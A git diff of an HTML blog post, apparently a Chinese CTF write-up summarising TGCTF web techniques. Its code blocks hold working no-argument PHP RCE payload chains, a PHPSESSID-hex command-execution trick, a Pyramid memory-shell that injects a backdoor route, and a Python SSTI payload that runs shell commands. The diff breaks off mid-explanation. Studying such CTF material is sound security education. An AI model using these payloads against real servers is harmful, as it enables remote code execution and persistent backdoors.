@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Web\r无参RCE/PHPSESSID绕过\r无参RCE\rTGCTF中并非是标准的无参RCE，但还是可以通过无参RCE来做，不过预期考点是PHPSESSID绕过\n经典的无参RCE像这样：\n1 2 3 4 5 6 php &lt;?php if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+((?R)?)/&#39;, NULL, $_GET[&#39;exp&#39;]){ eval($_GET[&#39;exp&#39;]); } ?&gt; 正则表达式递归匹配函数中的参数，使我们无法传参，所以我们需要只使用函数来达到获取flag的目的\n">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Web\r无参RCE/PHPSESSID绕过\r无参RCE\rTGCTF中并非是标准的无参RCE，但还是可以通过无参RCE来做，不过预期考点是PHPSESSID绕过\n经典的无参RCE像这样：\nphp &lt;?php if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+((?R)?)/&#39;, NULL, $_GET[&#39;exp&#39;]){ eval($_GET[&#39;exp&#39;]); } ?&gt; 正则表达式递归匹配函数中的参数，使我们无法传参，所以我们需要只使用函数来达到获取flag的目的\n">
 <title>TGCTF知识梳理</title>
 
 <link rel='canonical' href='https://Oight.github.io/p/tgctf%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/'>
 
-<link rel="stylesheet" href="/scss/style.min.0e9b0dc41309ee439f307e94fe233ae09b70f32858267ed1afae44d0ba448205.css"><meta property='og:title' content="TGCTF知识梳理">
-<meta property='og:description' content="Web\r无参RCE/PHPSESSID绕过\r无参RCE\rTGCTF中并非是标准的无参RCE，但还是可以通过无参RCE来做，不过预期考点是PHPSESSID绕过\n经典的无参RCE像这样：\n1 2 3 4 5 6 php &lt;?php if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+((?R)?)/&#39;, NULL, $_GET[&#39;exp&#39;]){ eval($_GET[&#39;exp&#39;]); } ?&gt; 正则表达式递归匹配函数中的参数，使我们无法传参，所以我们需要只使用函数来达到获取flag的目的\n">
+<link rel="stylesheet" href="/scss/style.min.cfe2632a91c7cb600e0badeaecd0da79bddaa315643726e117b52f62c13fe88c.css"><meta property='og:title' content="TGCTF知识梳理">
+<meta property='og:description' content="Web\r无参RCE/PHPSESSID绕过\r无参RCE\rTGCTF中并非是标准的无参RCE，但还是可以通过无参RCE来做，不过预期考点是PHPSESSID绕过\n经典的无参RCE像这样：\nphp &lt;?php if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+((?R)?)/&#39;, NULL, $_GET[&#39;exp&#39;]){ eval($_GET[&#39;exp&#39;]); } ?&gt; 正则表达式递归匹配函数中的参数，使我们无法传参，所以我们需要只使用函数来达到获取flag的目的\n">
 <meta property='og:url' content='https://Oight.github.io/p/tgctf%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/'>
 <meta property='og:site_name' content='Oight'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-06-01T10:32:07&#43;08:00'/><meta property='article:modified_time' content='2025-06-01T10:32:07&#43;08:00'/>
 <meta name="twitter:title" content="TGCTF知识梳理">
-<meta name="twitter:description" content="Web\r无参RCE/PHPSESSID绕过\r无参RCE\rTGCTF中并非是标准的无参RCE，但还是可以通过无参RCE来做，不过预期考点是PHPSESSID绕过\n经典的无参RCE像这样：\n1 2 3 4 5 6 php &lt;?php if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+((?R)?)/&#39;, NULL, $_GET[&#39;exp&#39;]){ eval($_GET[&#39;exp&#39;]); } ?&gt; 正则表达式递归匹配函数中的参数，使我们无法传参，所以我们需要只使用函数来达到获取flag的目的\n">
+<meta name="twitter:description" content="Web\r无参RCE/PHPSESSID绕过\r无参RCE\rTGCTF中并非是标准的无参RCE，但还是可以通过无参RCE来做，不过预期考点是PHPSESSID绕过\n经典的无参RCE像这样：\nphp &lt;?php if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+((?R)?)/&#39;, NULL, $_GET[&#39;exp&#39;]){ eval($_GET[&#39;exp&#39;]); } ?&gt; 正则表达式递归匹配函数中的参数，使我们无法传参，所以我们需要只使用函数来达到获取flag的目的\n">
     <link rel="shortcut icon" href="/favicon.ico" />
 
     </head>
@@ -352,7 +352,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 9 分钟
+                    阅读时长: 8 分钟
                 </time>
             </div>
         
@@ -372,59 +372,16 @@
 </h2><h3 id="无参rce">无参RCE
 </h3><p>TGCTF中并非是标准的无参RCE，但还是可以通过无参RCE来做，不过预期考点是PHPSESSID绕过</p>
 <p>经典的无参RCE像这样：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php
 </span></span><span class="line"><span class="cl">&lt;?php
 </span></span><span class="line"><span class="cl">    if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+((?R)?)/&#39;, NULL, $_GET[&#39;exp&#39;]){
 </span></span><span class="line"><span class="cl">            eval($_GET[&#39;exp&#39;]);
 </span></span><span class="line"><span class="cl">    }
 </span></span><span class="line"><span class="cl">?&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>正则表达式递归匹配函数中的参数，使我们无法传参，所以我们需要只使用函数来达到获取flag的目的</p>
+</span></span></code></pre></div><p>正则表达式递归匹配函数中的参数，使我们无法传参，所以我们需要只使用函数来达到获取flag的目的</p>
 <p>无参RCE本质是程序中错误地使用了命令执行函数如 eval() 且采用了存在绕过隐患的黑名单匹配用户输入，考察的点是对PHP中函数特性的利用</p>
 <p>下面整理一些可以被利用的函数：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">scandir() :将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">scandir() :将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">localeconv() ：返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个.的用处很大）
 </span></span><span class="line"><span class="cl">
@@ -451,9 +408,7 @@
 </span></span><span class="line"><span class="cl">eval()、assert()：命令执行
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">hightlight_file()、show_source()、readfile()：读取文件内容
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>比如：</p>
+</span></span></code></pre></div><p>比如：</p>
 <p>scandir(‘.’) 可以返回当前目录，但是正则匹配了我们的参数，导致我们无法传参。所以我们需要想办法构造一个” . “  ，这时候我们就可以利用 localeconv() ,因为它返回的第一个元素就是 “ . “ ( 关于为什么 localeconv()  返回的第一个元素是 . 可以看这里：<a class="link" href="https://www.runoob.com/php/func-string-localeconv.html"  target="_blank" rel="noopener"
     >PHP localeconv() 函数</a> )</p>
 <p>这时候我们就可以得到一个查看当前目录文件的Payload：</p>
@@ -464,24 +419,7 @@
 <p>根据flag文件的位置不同，我们可以搭配 next() 或 prev() 和 array_reverse() 一起使用</p>
 <p>比如：</p>
 <p>我们使用 <code>?参数=var_dump(scandir(current(localeconv())));</code> 看到当前目录是这样的：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php
 </span></span><span class="line"><span class="cl">array(3) {
 </span></span><span class="line"><span class="cl">    [0]=&gt;
 </span></span><span class="line"><span class="cl">    string(1) &#34;.&#34;
@@ -494,27 +432,8 @@
 </span></span><span class="line"><span class="cl">    [4]=&gt;
 </span></span><span class="line"><span class="cl">    string(5) &#34;index.php&#34;
 </span></span><span class="line"><span class="cl">}
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>我们看到 flag.php 在倒数第二个，比较靠后的位置，这时候我们就可以用 array_reverse() 将数组内容反转，让它从倒数第二变成正数第二：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php
+</span></span></code></pre></div><p>我们看到 flag.php 在倒数第二个，比较靠后的位置，这时候我们就可以用 array_reverse() 将数组内容反转，让它从倒数第二变成正数第二：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php
 </span></span><span class="line"><span class="cl">array(3) {
 </span></span><span class="line"><span class="cl">    [0]=&gt;
 </span></span><span class="line"><span class="cl">    string(5) &#34;index.php&#34;
@@ -527,48 +446,22 @@
 </span></span><span class="line"><span class="cl">    [4]=&gt;
 </span></span><span class="line"><span class="cl">    string(1) &#34;.&#34;
 </span></span><span class="line"><span class="cl">}
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>然后我们就可以使用 next() 使内部指针指向第二个元素（即flag.php）并将其输出，最后我们可以用 highlight_file() 返回文件内容</p>
+</span></span></code></pre></div><p>然后我们就可以使用 next() 使内部指针指向第二个元素（即flag.php）并将其输出，最后我们可以用 highlight_file() 返回文件内容</p>
 <p>相关的方法：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">end() - 将内部指针指向数组中的最后一个元素，并输出。
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">end() - 将内部指针指向数组中的最后一个元素，并输出。
 </span></span><span class="line"><span class="cl">next() - 将内部指针指向数组中的下一个元素，并输出。
 </span></span><span class="line"><span class="cl">prev() - 将内部指针指向数组中的上一个元素，并输出。
 </span></span><span class="line"><span class="cl">reset() - 将内部指针指向数组中的第一个元素，并输出。
 </span></span><span class="line"><span class="cl">each() - 返回当前元素的键名和键值，并将内部指针向前移动。
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>常见Payload：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">highlight_file(array_rand(array_flip(scandir(getcwd())))); //查看和读取当前目录文件
+</span></span></code></pre></div><p>常见Payload：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">highlight_file(array_rand(array_flip(scandir(getcwd())))); //查看和读取当前目录文件
 </span></span><span class="line"><span class="cl">print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件
 </span></span><span class="line"><span class="cl">print_r(scandir(next(scandir(getcwd()))));  //查看上一级目录的文件
 </span></span><span class="line"><span class="cl">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //读取上级目录文件
 </span></span><span class="line"><span class="cl">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//读取上级目录文件
 </span></span><span class="line"><span class="cl">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//读取上级目录文件
 </span></span><span class="line"><span class="cl">show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>以上是如何读取flag ，接下来我们来看看如何命令执行：</p>
+</span></span></code></pre></div><p>以上是如何读取flag ，接下来我们来看看如何命令执行：</p>
 <p>使用session_id() 来RCE的也算在这里面，但这个我们单拎出来放后面</p>
 <h5 id="getallheaders">getallheaders()
 </h5><p>getallheaders()返回当前请求的所有请求头信息，局限于Apache（ apache_request_headers()和getallheaders()功能相似，可互相替代，不过也是局限于Apache ）</p>
@@ -591,53 +484,24 @@
 <p>执行逻辑：</p>
 <h4 id="1-参数传递"><strong>1. 参数传递</strong>
 </h4><p>用户发送的 GET 请求参数：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">plaintext</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">plaintext</span>
 </span></span><span class="line"><span class="cl"><span class="n">a</span><span class="o">=</span><span class="n">eval</span><span class="p">(</span><span class="n">end</span><span class="p">(</span><span class="n">current</span><span class="p">(</span><span class="n">get_defined_vars</span><span class="p">())));</span><span class="o">&amp;</span><span class="n">b</span><span class="o">=</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;ls /&#39;</span><span class="p">);</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><ul>
+</span></span></code></pre></div><ul>
 <li>参数 <code>a</code> 的值为字符串 <code>eval(end(current(get_defined_vars())))</code>。</li>
 <li>参数 <code>b</code> 的值为字符串 <code>system('ls /')</code>。</li>
 </ul>
 <h4 id="2-执行"><strong>2. 执行 <code>eval($_GET['a'])</code></strong>
 </h4><p>PHP 脚本调用 <code>eval($_GET['a'])</code>，将参数 <code>a</code> 的值作为 PHP 代码执行：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">php</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">php</span>
 </span></span><span class="line"><span class="cl"><span class="n">eval</span><span class="p">(</span><span class="s2">&#34;eval(end(current(get_defined_vars())));&#34;</span><span class="p">);</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h4 id="3-内层"><strong>3. 内层 <code>eval</code> 的执行流程</strong>
+</span></span></code></pre></div><h4 id="3-内层"><strong>3. 内层 <code>eval</code> 的执行流程</strong>
 </h4><p>拆解内层 <code>eval</code> 的参数 <code>end(current(get_defined_vars()))</code>：</p>
 <ul>
 <li>
 <p><strong>步骤 3.1</strong>：<code>get_defined_vars()</code>
 返回当前作用域的所有已定义变量（包括超全局变量 <code>$_GET</code>、<code>$_SERVER</code> 等）。
 返回的数组结构类似：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">php</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">php</span>
 </span></span><span class="line"><span class="cl"><span class="n">array</span><span class="p">(</span>
 </span></span><span class="line"><span class="cl">    <span class="s1">&#39;_GET&#39;</span> <span class="o">=&gt;</span> <span class="n">array</span><span class="p">(</span>
 </span></span><span class="line"><span class="cl">        <span class="s1">&#39;a&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;eval(end(current(get_defined_vars())))&#39;</span><span class="p">,</span>
@@ -646,23 +510,13 @@
 </span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="err">其他变量如</span> <span class="o">$</span><span class="n">_SERVER</span><span class="err">、</span><span class="o">$</span><span class="n">_POST</span> <span class="err">等</span>
 </span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="err">脚本中可能定义的其他变量</span>
 </span></span><span class="line"><span class="cl"><span class="p">);</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 <li>
 <p><strong>步骤 3.2</strong>：<code>current(get_defined_vars())</code>
 取 <code>get_defined_vars()</code> 返回数组的第一个元素的值。假设第一个元素是 <code>$_GET</code>，则返回 <code>$_GET</code> 数组：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php
 </span></span><span class="line"><span class="cl">array(&#39;a&#39; =&gt; &#39;...&#39;, &#39;b&#39; =&gt; &#39;...&#39;);
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 <li>
 <p><strong>步骤 3.3</strong>：<code>end(current(get_defined_vars()))</code>
 将 <code>$_GET</code> 数组的内部指针移动到最后一个元素，并返回该元素的值。假设参数 <code>b</code> 是最后一个元素，则返回 <code>system('ls /')</code>。</p>
@@ -685,19 +539,10 @@
 <blockquote>
 <p>cookie: PHPSESSID=706870696e666f28293b</p></blockquote>
 <p>TGCTF中的预期解就是这样：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?tgctf2025=session_start();system(hex2bin(session_id()));
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?tgctf2025=session_start();system(hex2bin(session_id()));
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">PHPSESSID=636174202f666c6167 cat /flag的十六进制
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>参考：</p>
+</span></span></code></pre></div><p>参考：</p>
 <blockquote>
 <p><a class="link" href="https://blog.csdn.net/2301_76690905/article/details/133808536"  target="_blank" rel="noopener"
     >无参数RCE绕过的详细总结（六种方法）</a>
@@ -710,46 +555,15 @@
 </h3><p>这个后面另外详细写一篇进行整理</p>
 <h5 id="pyramid-框架内存马">pyramid 框架内存马
 </h5><p>这道题中我们注意到：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
 </span></span><span class="line"><span class="cl">def checkExpr(expr_input):
 </span></span><span class="line"><span class="cl">    expr = re.split(r&#34;[-+]&#34;, expr_input)
 </span></span><span class="line"><span class="cl">    print(exec(expr_input))  # 致命漏洞：未过滤直接执行用户输入！
 </span></span><span class="line"><span class="cl">    if len(expr) != 2:
 </span></span><span class="line"><span class="cl">        return 0
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>这一部分完全没有过滤用户输入，所以我们可以很轻松地传递 expr 来写入内存马</p>
+</span></span></code></pre></div><p>这一部分完全没有过滤用户输入，所以我们可以很轻松地传递 expr 来写入内存马</p>
 <p>我们这样注入：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
 </span></span><span class="line"><span class="cl">expr=exec(&#34;
 </span></span><span class="line"><span class="cl"># 获取当前配置器（确保作用域正确）
 </span></span><span class="line"><span class="cl">from pyramid.threadlocal import get_current_registry
@@ -764,53 +578,27 @@
 </span></span><span class="line"><span class="cl">)
 </span></span><span class="line"><span class="cl">config.commit()  # 关键！提交配置变更
 </span></span><span class="line"><span class="cl">&#34;)#+1
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>后面访问 shell 路由来RCE就行</p>
+</span></span></code></pre></div><p>后面访问 shell 路由来RCE就行</p>
 <p>这道题中的内存马比较好写，完全没有过滤，Pyramid又允许在运行时动态修改路由配置，所以我们直接往进加后门路由就好了</p>
 <h3 id="ssti类继承利用">SSTI，类继承利用
 </h3><p>Payload:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
 </span></span><span class="line"><span class="cl">(
 </span></span><span class="line"><span class="cl">    [].__class__.__mro__[1].__subclasses__()[351](
 </span></span><span class="line"><span class="cl">        &#39;cat flag&#39;, shell=True, stdout=-1
 </span></span><span class="line"><span class="cl">    ).communicate()[0].strip()
 </span></span><span class="line"><span class="cl">)
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>用AI解释一下：</p>
+</span></span></code></pre></div><p>用AI解释一下：</p>
 <p>这个代码片段是一个典型的 <strong>Python SSTI（Server-Side Template Injection）攻击 Payload</strong>，通过滥用 Python 的反射和继承机制来执行任意系统命令。以下是其详细解释和工作原理分析：</p>
 <hr>
 <p><strong>代码结构拆解</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
 </span></span><span class="line"><span class="cl">(
 </span></span><span class="line"><span class="cl">    [].__class__.__mro__[1].__subclasses__()[351](
 </span></span><span class="line"><span class="cl">        &#39;cat flag&#39;, shell=True, stdout=-1
 </span></span><span class="line"><span class="cl">    ).communicate()[0].strip()
 </span></span><span class="line"><span class="cl">)
-</span></span></code></pre></td></tr></table>
-</div>
-</div><hr>
+</span></span></code></pre></div><hr>
 <p><strong>逐层解析</strong></p>
 <ol>
 <li><strong><code>[]</code>（空列表）</strong></li>
@@ -824,74 +612,29 @@
 <ul>
 <li>
 <p>获取列表对象的类（即</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">list
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>类）：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">list
+</span></span></code></pre></div><p>类）：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
 </span></span><span class="line"><span class="cl">list_class = [].__class__  # 等价于 list
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 <ol>
 <li><strong><code>.__mro__</code></strong></li>
 </ol>
 <ul>
 <li>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__mro__
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>是一个元组，表示类的</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__mro__
+</span></span></code></pre></div><p>是一个元组，表示类的</p>
 <p>方法解析顺序</p>
 <p>（Method Resolution Order）。对于</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">list
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>类，其继承链为：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">plaintext
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">list
+</span></span></code></pre></div><p>类，其继承链为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">plaintext
 </span></span><span class="line"><span class="cl">list → object
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>因此：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
